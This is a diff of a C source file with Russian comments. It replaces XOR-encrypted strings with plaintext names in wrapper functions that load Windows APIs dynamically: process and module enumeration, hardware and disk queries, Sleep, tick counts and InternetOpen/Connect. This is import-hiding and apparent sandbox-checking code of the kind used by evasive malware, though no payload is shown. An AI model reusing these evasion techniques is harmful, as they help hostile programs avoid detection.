@@ -14,6 +14,8 @@
 #include <cfgmgr32.h>
 #include <wininet.h>
 
+#include "encrypt_char.c"
+
 
 void Xor_Encrypt(char* data, size_t len, const char* key) {         // Данную функцию вставляем в проект
     size_t key_len = strlen(key);                   // Вычисляем длину ключа
@@ -29,21 +31,11 @@ void ProxyGetSystemInfo(LPSYSTEM_INFO lpSystemInfo) {
                                                                 // принимающую указатель на SYSTEM_INFO, и не возвращающую значение
                                                                 // это позволит динмамически загружать функцию GetSystemInfo
                                                                 // Указываем что возвращает и что принимает
+    char funcName_utka[] = "GetSystemInfo";
+    char name_dll_utka[] = "kernel32.dll";
 
-    const char *key = "DFEWPWPDSPFEPWEQOUSDFUIKKSLASDJQFSSKFLWKSKEFJLSS";
-    
-    // char funcName[] = "GetSystemInfo";
-    // char funcName[] = { 'G','e','t','S','y','s','t','e','m','I','n','f','o','\0' };
-    char funcName[14] = {0x03, 0x23, 0x31, 0x04, 0x29, 0x24, 0x24, 0x21, 0x3E, 0x19, 0x28, 0x23, 0x3F, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-
-    // char name_dll[] = "kernel32.dll";
-    // char name_dll[] = { 'k','e','r','n','e','l','3','2','.','d','l','l','\0' };
-    char name_dll[13] = {0x2F, 0x23, 0x37, 0x39, 0x35, 0x3B, 0x63, 0x76, 0x7D, 0x34, 0x2A, 0x29, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
-    
-    HMODULE hKernel32 = LoadLibraryA(name_dll);                 // Загружаем дескриптор библиотеки kernel32.dll, которая содержит GetSystemInfo
-    pGetSystemInfo GetSystemInfoFunc = (pGetSystemInfo)GetProcAddress(hKernel32, funcName); // Получаем адрес функции GetSystemInfo в этой библиотеке
+    HMODULE hKernel32 = LoadLibraryA(name_dll_utka);                 // Загружаем дескриптор библиотеки kernel32.dll, которая содержит GetSystemInfo
+    pGetSystemInfo GetSystemInfoFunc = (pGetSystemInfo)GetProcAddress(hKernel32, funcName_utka); // Получаем адрес функции GetSystemInfo в этой библиотеке
 
     if (GetSystemInfoFunc != NULL) {                            // Если функция загружена, вызываем ее
         GetSystemInfoFunc(lpSystemInfo);                        // Вызов функции GetSystemInfo
@@ -57,19 +49,12 @@ void ProxyGetSystemInfo(LPSYSTEM_INFO lpSystemInfo) {
 
 void ProxySleep(int second_sleep) {
     typedef void(WINAPI* pSleep)(int);
-
-    const char *key = "DFEWPWPDSPFEPWEQOUSDFUIKKSLASDJQFSSKFLWKSKEFJLSS";
     
-    // char funcName[] = { 'S','l','e','e','p','\0'};
-    char funcName[6] = {0x17, 0x2A, 0x20, 0x32, 0x20, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
+    char funcName_utka[] = "Sleep";
+    char name_dll_utka[] = "kernel32.dll";
     
-    // char name_dll[] = { 'k','e','r','n','e','l','3','2','.','d','l','l','\0' };
-    char name_dll[13] = {0x2F, 0x23, 0x37, 0x39, 0x35, 0x3B, 0x63, 0x76, 0x7D, 0x34, 0x2A, 0x29, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
-    
-    HMODULE hKernel32 = LoadLibraryA(name_dll);
-    pSleep SleepFunc = (pSleep)GetProcAddress(hKernel32, funcName);
+    HMODULE hKernel32 = LoadLibraryA(name_dll_utka);
+    pSleep SleepFunc = (pSleep)GetProcAddress(hKernel32, funcName_utka);
     if (SleepFunc != NULL) {
         SleepFunc(second_sleep);
     } else {
@@ -83,19 +68,11 @@ void ProxySleep(int second_sleep) {
 ULONGLONG ProxyGetTickCount64(void) {
     typedef ULONGLONG(WINAPI* pProxyGetTickCount64)(void);
 
-    const char *key = "DFEWPWPDSPFEPWEQOUSDFUIKKSLASDJQFSSKFLWKSKEFJLSS";
-
-    // char funcName[] = { 'G','e','t','T','i','c','k','C','o','u','n','t','6','4','\0'};
-    char funcName[15] = {0x03, 0x23, 0x31, 0x03, 0x39, 0x34, 0x3B, 0x07, 0x3C, 0x25, 0x28, 0x31, 0x66, 0x63, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-
-    // char name_dll[] = { 'k','e','r','n','e','l','3','2','.','d','l','l','\0' };
-    char name_dll[13] = {0x2F, 0x23, 0x37, 0x39, 0x35, 0x3B, 0x63, 0x76, 0x7D, 0x34, 0x2A, 0x29, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
-    
-    
-    HMODULE hKernel32 = LoadLibraryA(name_dll);
-    pProxyGetTickCount64 ProxyGetTickCount64Func = (pProxyGetTickCount64)GetProcAddress(hKernel32, funcName);
+    char funcName_utka[] = "GetTickCount64";
+    char name_dll_utka[] = "kernel32.dll";
+        
+    HMODULE hKernel32 = LoadLibraryA(name_dll_utka);
+    pProxyGetTickCount64 ProxyGetTickCount64Func = (pProxyGetTickCount64)GetProcAddress(hKernel32, funcName_utka);
     if (ProxyGetTickCount64Func != NULL) {
         return ProxyGetTickCount64Func();
     } else {
@@ -109,19 +86,11 @@ ULONGLONG ProxyGetTickCount64(void) {
 WINBOOL ProxyGlobalMemoryStatusEx(LPMEMORYSTATUSEX lpBuffer) {
     typedef WINBOOL(WINAPI* pGlobalMemoryStatusEx)(LPMEMORYSTATUSEX);
     
-    const char *key = "DFEWPWPDSPFEPWEQOUSDFUIKKSLASDJQFSSKFLWKSKEFJLSS";
-
-    //char funcName[] = { 'G','l','o','b','a','l','M','e','m','o','r','y','S','t','a','t','u','s','E','x','\0' };
-    char funcName[21] = {0x03, 0x2A, 0x2A, 0x35, 0x31, 0x3B, 0x1D, 0x21, 0x3E, 0x3F, 0x34, 0x3C, 0x03, 0x23, 0x24, 0x25, 0x3A, 0x26, 0x16, 0x3C, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-
-    // char name_dll[] = { 'k','e','r','n','e','l','3','2','.','d','l','l','\0' };
-    char name_dll[13] = {0x2F, 0x23, 0x37, 0x39, 0x35, 0x3B, 0x63, 0x76, 0x7D, 0x34, 0x2A, 0x29, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
-    
-    
-    HMODULE hKernel32 = LoadLibraryA(name_dll);
-    pGlobalMemoryStatusEx GlobalMemoryStatusExFunc = (pGlobalMemoryStatusEx)GetProcAddress(hKernel32, funcName);
+    char funcName_utka[] = "GlobalMemoryStatusEx";
+    char name_dll_utka[] = "kernel32.dll";
+        
+    HMODULE hKernel32 = LoadLibraryA(name_dll_utka);
+    pGlobalMemoryStatusEx GlobalMemoryStatusExFunc = (pGlobalMemoryStatusEx)GetProcAddress(hKernel32, funcName_utka);
     if (GlobalMemoryStatusExFunc != NULL) {           
         GlobalMemoryStatusExFunc(lpBuffer);            
     } else {
@@ -135,18 +104,11 @@ WINBOOL ProxyGlobalMemoryStatusEx(LPMEMORYSTATUSEX lpBuffer) {
 DWORD ProxyGetAdaptersInfo(PIP_ADAPTER_INFO pAdapterInfo, PULONG dwSize) {
     typedef ULONG(WINAPI* pGetAdaptersInfo)(PIP_ADAPTER_INFO, PULONG);
     
-    const char *key = "DFEWPWPDSPFEPWEQOUSDFUIKKSLASDJQFSSKFLWKSKEFJLSS";
-
-    // char funcName[] = { 'G','e','t','A','d','a','p','t','e','r','s','I','n','f','o','\0' };
-    char funcName[16] = {0x03, 0x23, 0x31, 0x16, 0x34, 0x36, 0x20, 0x30, 0x36, 0x22, 0x35, 0x0C, 0x3E, 0x31, 0x2A, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-
-    // char name_dll[] = { 'i','p','h','l','p','a','p','i','.','d','l','l','\0' };
-    char name_dll[13] = {0x2D, 0x36, 0x2D, 0x3B, 0x20, 0x36, 0x20, 0x2D, 0x7D, 0x34, 0x2A, 0x29, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
+    char funcName_utka[] = "GetAdaptersInfo";
+    char name_dll_utka[] = "iphlpapi.dll";
     
-    HMODULE hIphlpApi = LoadLibraryA(name_dll);
-    pGetAdaptersInfo GetAdaptersInfoFunc = (pGetAdaptersInfo)GetProcAddress(hIphlpApi, funcName);
+    HMODULE hIphlpApi = LoadLibraryA(name_dll_utka);
+    pGetAdaptersInfo GetAdaptersInfoFunc = (pGetAdaptersInfo)GetProcAddress(hIphlpApi, funcName_utka);
     if (GetAdaptersInfoFunc != NULL) {
         return GetAdaptersInfoFunc(pAdapterInfo, dwSize);
     } else {
@@ -160,18 +122,11 @@ DWORD ProxyGetAdaptersInfo(PIP_ADAPTER_INFO pAdapterInfo, PULONG dwSize) {
 BOOL ProxyEnumProcesses(DWORD* lpidProcess, DWORD cb, DWORD* lpcbNeeded) {
     typedef BOOL(WINAPI* pEnumProcesses)(DWORD*, DWORD, DWORD*);
     
-    const char *key = "REGJTJAJCKKQKQDKFKQSDKQKDK";
+    char funcName_utka[] = "EnumProcesses";
+    char name_dll_utka[] = "psapi.dll";
     
-    // char funcName[] = { 'E','n','u','m','P','r','o','c','e','s','s','e','s','\0' };
-    char funcName[14] = {0x17, 0x2B, 0x32, 0x27, 0x04, 0x38, 0x2E, 0x29, 0x26, 0x38, 0x38, 0x34, 0x38, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-
-    // char name_dll[] = { 'p','s','a','p','i','.','d','l','l','\0' };
-    char name_dll[10] = {0x22, 0x36, 0x26, 0x3A, 0x3D, 0x64, 0x25, 0x26, 0x2F, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
-    
-    HMODULE hPsApi = LoadLibraryA(name_dll);
-    pEnumProcesses EnumProcessesFunc = (pEnumProcesses)GetProcAddress(hPsApi, funcName);
+    HMODULE hPsApi = LoadLibraryA(name_dll_utka);
+    pEnumProcesses EnumProcessesFunc = (pEnumProcesses)GetProcAddress(hPsApi, funcName_utka);
     if (EnumProcessesFunc != NULL) {
         EnumProcessesFunc(lpidProcess, cb, lpcbNeeded);
     } else {
@@ -185,18 +140,11 @@ BOOL ProxyEnumProcesses(DWORD* lpidProcess, DWORD cb, DWORD* lpcbNeeded) {
 HANDLE ProxyOpenProcess(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId) {
     typedef HANDLE(WINAPI* pOpenProcess)(DWORD, WINBOOL, DWORD);
     
-    const char *key = "REGJTJAJCKKQKQDKFKQSDKQKDK";
-
-    // char funcName[] = { 'O','p','e','n','P','r','o','c','e','s','s','\0' };
-    char funcName[12] = {0x1D, 0x35, 0x22, 0x24, 0x04, 0x38, 0x2E, 0x29, 0x26, 0x38, 0x38, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-
-    // char name_dll[] = { 'k','e','r','n','e','l','3','2','.','d','l','l','\0' };
-    char name_dll[14] = {0x39, 0x20, 0x35, 0x24, 0x31, 0x26, 0x72, 0x78, 0x6D, 0x2F, 0x27, 0x3D, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
+    char funcName_utka[] = "OpenProcess";
+    char name_dll_utka[] = "kernel32.dll";
     
-    HMODULE hKernel32 = LoadLibraryA(name_dll);
-    pOpenProcess OpenProcessFunc = (pOpenProcess)GetProcAddress(hKernel32, funcName);
+    HMODULE hKernel32 = LoadLibraryA(name_dll_utka);
+    pOpenProcess OpenProcessFunc = (pOpenProcess)GetProcAddress(hKernel32, funcName_utka);
     if (OpenProcessFunc != NULL) {
         HANDLE hProcess = OpenProcessFunc(dwDesiredAccess, bInheritHandle, dwProcessId);
         return hProcess;
@@ -211,18 +159,11 @@ HANDLE ProxyOpenProcess(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwP
 BOOL ProxyEnumProcessModules(HANDLE hProcess, HMODULE* lphModule, DWORD cb, LPDWORD lpcbNeeded) {
     typedef HANDLE(WINAPI* pEnumProcessModules)(HANDLE, HMODULE*, DWORD, LPDWORD);
     
-    const char *key = "REGJTJAJCKKQKQDKFKQSDKQKDK";
-
-    // char funcName[] = { 'E','n','u','m','P','r','o','c','e','s','s','M','o','d','u','l','e','s','\0' };
-    char funcName[19] = {0x17, 0x2B, 0x32, 0x27, 0x04, 0x38, 0x2E, 0x29, 0x26, 0x38, 0x38, 0x1C, 0x24, 0x35, 0x31, 0x27, 0x23, 0x38, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-
-    // char name_dll[] = { 'p','s','a','p','i','.','d','l','l','\0' };
-    char name_dll[10] = {0x22, 0x36, 0x26, 0x3A, 0x3D, 0x64, 0x25, 0x26, 0x2F, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
+    char funcName_utka[] = "EnumProcessModules";
+    char name_dll_utka[] = "psapi.dll";
     
-    HMODULE hPsApi = LoadLibraryA(name_dll);
-    pEnumProcessModules EnumProcessModulesFunc = (pEnumProcessModules)GetProcAddress(hPsApi, funcName);
+    HMODULE hPsApi = LoadLibraryA(name_dll_utka);
+    pEnumProcessModules EnumProcessModulesFunc = (pEnumProcessModules)GetProcAddress(hPsApi, funcName_utka);
     if (EnumProcessModulesFunc != NULL) {
         EnumProcessModulesFunc(hProcess, lphModule, cb, lpcbNeeded);
     } else {
@@ -236,18 +177,11 @@ BOOL ProxyEnumProcessModules(HANDLE hProcess, HMODULE* lphModule, DWORD cb, LPDW
 DWORD ProxyGetModuleBaseName(HANDLE hProcess, HMODULE hModule, LPSTR lpBaseName, DWORD nSize) {
     typedef DWORD(WINAPI* pGetModuleBaseName)(HANDLE, HMODULE, LPSTR, DWORD);
     
-    const char *key = "REGJTJAJCKKQKQDKFKQSDKQKDK";
-
-    //char funcName[] = { 'G','e','t','M','o','d','u','l','e','B','a','s','e','N','a','m','e','A','\0' };
-    char funcName[19] = {0x15, 0x20, 0x33, 0x07, 0x3B, 0x2E, 0x34, 0x26, 0x26, 0x09, 0x2A, 0x22, 0x2E, 0x1F, 0x25, 0x26, 0x23, 0x0A, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
+    char funcName_utka[] = "GetModuleBaseNameA";
+    char name_dll_utka[] = "psapi.dll";
     
-    // char name_dll[] = { 'p','s','a','p','i','.','d','l','l','\0' };
-    char name_dll[10] = {0x22, 0x36, 0x26, 0x3A, 0x3D, 0x64, 0x25, 0x26, 0x2F, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
-
-    HMODULE hPsApi = LoadLibraryA(name_dll);
-    pGetModuleBaseName GetModuleBaseNameFunc = (pGetModuleBaseName)GetProcAddress(hPsApi, funcName);
+    HMODULE hPsApi = LoadLibraryA(name_dll_utka);
+    pGetModuleBaseName GetModuleBaseNameFunc = (pGetModuleBaseName)GetProcAddress(hPsApi, funcName_utka);
     if (GetModuleBaseNameFunc != NULL) {
         GetModuleBaseNameFunc(hProcess, hModule, lpBaseName, nSize);
     } else {
@@ -261,18 +195,11 @@ DWORD ProxyGetModuleBaseName(HANDLE hProcess, HMODULE hModule, LPSTR lpBaseName,
 BOOL ProxyEnumDisplayDevices(LPCSTR lpDevice, DWORD iDevNum, PDISPLAY_DEVICEA lpDisplayDevice, DWORD dwFlags) {
     typedef BOOL(WINAPI* pEnumDisplayDevices)(LPCSTR, DWORD, PDISPLAY_DEVICEA, DWORD);
     
-    const char *key = "REGJTJAJCKKQKQDKFKQSDKQKDK";
+    char funcName_utka[] = "EnumDisplayDevicesA";
+    char name_dll_utka[] = "user32.dll";
     
-    // char funcName[] = { 'E','n','u','m','D','i','s','p','l','a','y','D','e','v','i','c','e','s','A','\0' };
-    char funcName[20] = {0x17, 0x2B, 0x32, 0x27, 0x10, 0x23, 0x32, 0x3A, 0x2F, 0x2A, 0x32, 0x15, 0x2E, 0x27, 0x2D, 0x28, 0x23, 0x38, 0x10, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-
-    // char name_dll[] = { 'u','s','e','r','3','2','.','d','l','l','\0' };
-    char name_dll[11] = {0x27, 0x36, 0x22, 0x38, 0x67, 0x78, 0x6F, 0x2E, 0x2F, 0x27, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
-    
-    HMODULE hUser32 = LoadLibraryA(name_dll);
-    pEnumDisplayDevices EnumDisplayDevicesFunc = (pEnumDisplayDevices)GetProcAddress(hUser32, funcName);
+    HMODULE hUser32 = LoadLibraryA(name_dll_utka);
+    pEnumDisplayDevices EnumDisplayDevicesFunc = (pEnumDisplayDevices)GetProcAddress(hUser32, funcName_utka);
     if (EnumDisplayDevicesFunc != NULL) {
         EnumDisplayDevicesFunc(lpDevice, iDevNum, lpDisplayDevice, dwFlags);
     } else {
@@ -286,18 +213,11 @@ BOOL ProxyEnumDisplayDevices(LPCSTR lpDevice, DWORD iDevNum, PDISPLAY_DEVICEA lp
 HDEVINFO ProxySetupDiGetClassDevs(const GUID *ClassGuid, PCSTR Enumerator, HWND hwndParent, DWORD Flags) {
     typedef HDEVINFO(WINAPI* pSetupDiGetClassDevs)(const GUID *, PCSTR, HWND, DWORD);
     
-    const char *key = "REGJTJAJCKKQKQDKFKQSDKQKDK";
-
-    // char funcName[] = { 'S','e','t','u','p','D','i','G','e','t','C','l','a','s','s','D','e','v','s','A','\0' };
-    char funcName[21] = {0x01, 0x20, 0x33, 0x3F, 0x24, 0x0E, 0x28, 0x0D, 0x26, 0x3F, 0x08, 0x3D, 0x2A, 0x22, 0x37, 0x0F, 0x23, 0x3D, 0x22, 0x12, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-
-    // char name_dll[] = { 's','e','t','u','p','a','p','i','.','d','l','l','\0' };
-    char name_dll[13] = {0x21, 0x20, 0x33, 0x3F, 0x24, 0x2B, 0x31, 0x23, 0x6D, 0x2F, 0x27, 0x3D, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
+    char funcName_utka[] = "SetupDiGetClassDevsA";
+    char name_dll_utka[] = "setupapi.dll";
     
-    HMODULE hSetupApi = LoadLibraryA(name_dll);
-    pSetupDiGetClassDevs SetupDiGetClassDevsFunc = (pSetupDiGetClassDevs)GetProcAddress(hSetupApi, funcName);
+    HMODULE hSetupApi = LoadLibraryA(name_dll_utka);
+    pSetupDiGetClassDevs SetupDiGetClassDevsFunc = (pSetupDiGetClassDevs)GetProcAddress(hSetupApi, funcName_utka);
     if (SetupDiGetClassDevsFunc != NULL) {
         return SetupDiGetClassDevsFunc(ClassGuid, Enumerator, hwndParent, Flags);
     } else {
@@ -305,24 +225,17 @@ HDEVINFO ProxySetupDiGetClassDevs(const GUID *ClassGuid, PCSTR Enumerator, HWND 
         exit(1);
     }
     FreeLibrary(hSetupApi);
-}
+} 
 
 
 WINBOOL ProxySetupDiEnumDeviceInfo(HDEVINFO DeviceInfoSet, DWORD MemberIndex, PSP_DEVINFO_DATA DeviceInfoData) {
     typedef WINBOOL(WINAPI* pSetupDiEnumDeviceInfo)(HDEVINFO, DWORD, PSP_DEVINFO_DATA);
     
-    const char *key = "REGJTJAJCKKQKQDKFKQSDKQKDK";
-
-    // char funcName[] = { 'S','e','t','u','p','D','i','E','n','u','m','D','e','v','i','c','e','I','n','f','o','\0' };
-    char funcName[22] = {0x01, 0x20, 0x33, 0x3F, 0x24, 0x0E, 0x28, 0x0F, 0x2D, 0x3E, 0x26, 0x15, 0x2E, 0x27, 0x2D, 0x28, 0x23, 0x02, 0x3F, 0x35, 0x2B, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-
-    // char name_dll[] = { 's','e','t','u','p','a','p','i','.','d','l','l','\0' };
-    char name_dll[13] = {0x21, 0x20, 0x33, 0x3F, 0x24, 0x2B, 0x31, 0x23, 0x6D, 0x2F, 0x27, 0x3D, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
+    char funcName_utka[] = "SetupDiEnumDeviceInfo";
+    char name_dll_utka[] = "setupapi.dll";
     
-    HMODULE hSetupApi = LoadLibraryA(name_dll);
-    pSetupDiEnumDeviceInfo SetupDiEnumDeviceInfoFunc = (pSetupDiEnumDeviceInfo)GetProcAddress(hSetupApi, funcName);
+    HMODULE hSetupApi = LoadLibraryA(name_dll_utka);
+    pSetupDiEnumDeviceInfo SetupDiEnumDeviceInfoFunc = (pSetupDiEnumDeviceInfo)GetProcAddress(hSetupApi, funcName_utka);
     if (SetupDiEnumDeviceInfoFunc != NULL) {
         return SetupDiEnumDeviceInfoFunc(DeviceInfoSet, MemberIndex, DeviceInfoData);
     } else {
@@ -337,18 +250,11 @@ WINBOOL ProxySetupDiEnumDeviceInfo(HDEVINFO DeviceInfoSet, DWORD MemberIndex, PS
 BOOL ProxySetupDiGetDeviceInstanceIdA(HDEVINFO DeviceInfoSet, PSP_DEVINFO_DATA DeviceInfoData, PSTR DeviceInstanceId, DWORD DeviceInstanceIdSize, PDWORD RequiredSize) {
     typedef BOOL(WINAPI* pSetupDiGetDeviceInstanceIdA)(HDEVINFO, PSP_DEVINFO_DATA, PSTR, DWORD, PDWORD);
     
-    const char *key = "REGJTJAJCKKQKQDKFKQSDKQKDK";
-
-    // char funcName[] = { 'S','e','t','u','p','D','i','G','e','t','D','e','v','i','c','e','I','n','s','t','a','n','c','e','I','d','A','\0' };
-    char funcName[28] = {0x01, 0x20, 0x33, 0x3F, 0x24, 0x0E, 0x28, 0x0D, 0x26, 0x3F, 0x0F, 0x34, 0x3D, 0x38, 0x27, 0x2E, 0x0F, 0x25, 0x22, 0x27, 0x25, 0x25, 0x32, 0x2E, 0x0D, 0x2F, 0x13, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-
-    // char name_dll[] = { 's','e','t','u','p','a','p','i','.','d','l','l','\0' };
-    char name_dll[13] = {0x21, 0x20, 0x33, 0x3F, 0x24, 0x2B, 0x31, 0x23, 0x6D, 0x2F, 0x27, 0x3D, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
+    char funcName_utka[] = "SetupDiGetDeviceInstanceIdA";
+    char name_dll_utka[] = "setupapi.dll";
     
-    HMODULE hSetupApi = LoadLibraryA(name_dll);
-    pSetupDiGetDeviceInstanceIdA SetupDiGetDeviceInstanceIdAFunc = (pSetupDiGetDeviceInstanceIdA)GetProcAddress(hSetupApi, funcName);
+    HMODULE hSetupApi = LoadLibraryA(name_dll_utka);
+    pSetupDiGetDeviceInstanceIdA SetupDiGetDeviceInstanceIdAFunc = (pSetupDiGetDeviceInstanceIdA)GetProcAddress(hSetupApi, funcName_utka);
     if (SetupDiGetDeviceInstanceIdAFunc != NULL) {
         return SetupDiGetDeviceInstanceIdAFunc(DeviceInfoSet, DeviceInfoData, DeviceInstanceId, DeviceInstanceIdSize, RequiredSize);
     } else {
@@ -362,18 +268,11 @@ BOOL ProxySetupDiGetDeviceInstanceIdA(HDEVINFO DeviceInfoSet, PSP_DEVINFO_DATA D
 DWORD  ProxyGetLogicalDrives(void) {
     typedef DWORD(WINAPI* pGetLogicalDrives)(void);
 
-    const char *key = "REGJTJAJCKKQKQDKFKQSDKQKDK";
-
-    // char funcName[] = { 'G','e','t','L','o','g','i','c','a','l','D','r','i','v','e','s','\0' };
-    char funcName[17] = {0x15, 0x20, 0x33, 0x06, 0x3B, 0x2D, 0x28, 0x29, 0x22, 0x27, 0x0F, 0x23, 0x22, 0x27, 0x21, 0x38, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-
-    // char name_dll[] = { 'k','e','r','n','e','l','3','2','.','d','l','l','\0' };
-    char name_dll[13] = {0x39, 0x20, 0x35, 0x24, 0x31, 0x26, 0x72, 0x78, 0x6D, 0x2F, 0x27, 0x3D, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
+    char funcName_utka[] = "GetLogicalDrives";
+    char name_dll_utka[] = "kernel32.dll";
     
-    HMODULE hKernel32 = LoadLibraryA(name_dll);
-    pGetLogicalDrives GetLogicalDrivesFunc = (pGetLogicalDrives)GetProcAddress(hKernel32, funcName);
+    HMODULE hKernel32 = LoadLibraryA(name_dll_utka);
+    pGetLogicalDrives GetLogicalDrivesFunc = (pGetLogicalDrives)GetProcAddress(hKernel32, funcName_utka);
     if (GetLogicalDrivesFunc != NULL) {
         return GetLogicalDrivesFunc();
     } else {
@@ -387,18 +286,11 @@ DWORD  ProxyGetLogicalDrives(void) {
 BOOL __stdcall ProxyGetDiskFreeSpaceExA(LPCSTR lpDirectoryName, PULARGE_INTEGER lpFreeBytesAvailableToCaller, PULARGE_INTEGER lpTotalNumberOfBytes, PULARGE_INTEGER lpTotalNumberOfFreeBytes) {
     typedef BOOL (WINAPI* pGetDiskFreeSpaceExA)(LPCSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);
     
-    const char *key = "REGJTJAJCKKQKQDKFKQSDKQKDK";
-
-    // char funcName[] = { 'G','e','t','D','i','s','k','F','r','e','e','S','p','a','c','e','E','x','A','\0' };
-    char funcName[20] = {0x15, 0x20, 0x33, 0x0E, 0x3D, 0x39, 0x2A, 0x0C, 0x31, 0x2E, 0x2E, 0x02, 0x3B, 0x30, 0x27, 0x2E, 0x03, 0x33, 0x10, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-
-    // char name_dll[] = { 'k','e','r','n','e','l','3','2','.','d','l','l','\0' };
-    char name_dll[13] = {0x39, 0x20, 0x35, 0x24, 0x31, 0x26, 0x72, 0x78, 0x6D, 0x2F, 0x27, 0x3D, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
+    char funcName_utka[] = "GetDiskFreeSpaceExA";
+    char name_dll_utka[] = "kernel32.dll";
     
-    HMODULE hKernel32 = LoadLibraryA(name_dll);
-    pGetDiskFreeSpaceExA GetDiskFreeSpaceExAFunc = (pGetDiskFreeSpaceExA)GetProcAddress(hKernel32, funcName);
+    HMODULE hKernel32 = LoadLibraryA(name_dll_utka);
+    pGetDiskFreeSpaceExA GetDiskFreeSpaceExAFunc = (pGetDiskFreeSpaceExA)GetProcAddress(hKernel32, funcName_utka);
     if (GetDiskFreeSpaceExAFunc != NULL) {
         return GetDiskFreeSpaceExAFunc(lpDirectoryName, lpFreeBytesAvailableToCaller, lpTotalNumberOfBytes, lpTotalNumberOfFreeBytes);
     } else {
@@ -412,18 +304,11 @@ BOOL __stdcall ProxyGetDiskFreeSpaceExA(LPCSTR lpDirectoryName, PULARGE_INTEGER 
 HINTERNET ProxyInternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags) {
     typedef HINTERNET (WINAPI* pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
     
-    const char *key = "REGJTJAJCKKQKQDKFKQSDKQKDK";
+    char funcName_utka[] = "InternetOpenA";
+    char name_dll_utka[] = "wininet.dll";
     
-    // char funcName[] = { 'I','n','t','e','r','n','e','t','O','p','e','n','A','\0' };
-    char funcName[14] = {0x1B, 0x2B, 0x33, 0x2F, 0x26, 0x24, 0x24, 0x3E, 0x0C, 0x3B, 0x2E, 0x3F, 0x0A, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-    
-    //char name_dll[] = { 'w','i','n','i','n','e','t','.','d','l','l','\0' };
-    char name_dll[12] = {0x25, 0x2C, 0x29, 0x23, 0x3A, 0x2F, 0x35, 0x64, 0x27, 0x27, 0x27, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
-    
-    HMODULE hWinInet = LoadLibraryA(name_dll);
-    pInternetOpenA InternetOpenAFunc = (pInternetOpenA)GetProcAddress(hWinInet, funcName);
+    HMODULE hWinInet = LoadLibraryA(name_dll_utka);
+    pInternetOpenA InternetOpenAFunc = (pInternetOpenA)GetProcAddress(hWinInet, funcName_utka);
     if (InternetOpenAFunc != NULL) {
         return InternetOpenAFunc(lpszAgent, dwAccessType, lpszProxy, lpszProxyBypass, dwFlags);
     } else {
@@ -437,18 +322,11 @@ HINTERNET ProxyInternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszPr
 HINTERNET ProxyInternetConnectA(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext) {
     typedef HINTERNET (WINAPI* pInternetConnectA)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
     
-    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";
-
-    // char funcName[] = { 'I','n','t','e','r','n','e','t','C','o','n','n','e','c','t','A','\0' };
-    char funcName[17] = {0x1F, 0x2D, 0x33, 0x31, 0x37, 0x3F, 0x36, 0x38, 0x05, 0x23, 0x3F, 0x22, 0x36, 0x27, 0x38, 0x07, 0x00 };
-    Xor_Encrypt(funcName, strlen(funcName), key);
-
-    // char name_dll[] = { 'w','i','n','i','n','e','t','.','d','l','l','\0' };
-    char name_dll[12] = {0x21, 0x2A, 0x29, 0x3D, 0x2B, 0x34, 0x27, 0x62, 0x22, 0x20, 0x3D, 0x00 };
-    Xor_Encrypt(name_dll, strlen(name_dll), key);
+    char funcName_utka[] = "InternetConnectA";
+    char name_dll_utka[] = "wininet.dll";
     
-    HMODULE hWinInet = LoadLibraryA(name_dll);
-    pInternetConnectA InternetConnectAFunc = (pInternetConnectA)GetProcAddress(hWinInet, funcName);
+    HMODULE hWinInet = LoadLibraryA(name_dll_utka);
+    pInternetConnectA InternetConnectAFunc = (pInternetConnectA)GetProcAddress(hWinInet, funcName_utka);
     if (InternetConnectAFunc != NULL) {
         return InternetConnectAFunc(hInternet, lpszServerName, nServerPort, lpszUserName, lpszPassword, dwService, dwFlags, dwContext);
     } else {
@@ -462,18 +340,11 @@ HINTERNET ProxyInternetConnectA(HINTERNET hInternet, LPCSTR lpszServerName, INTE
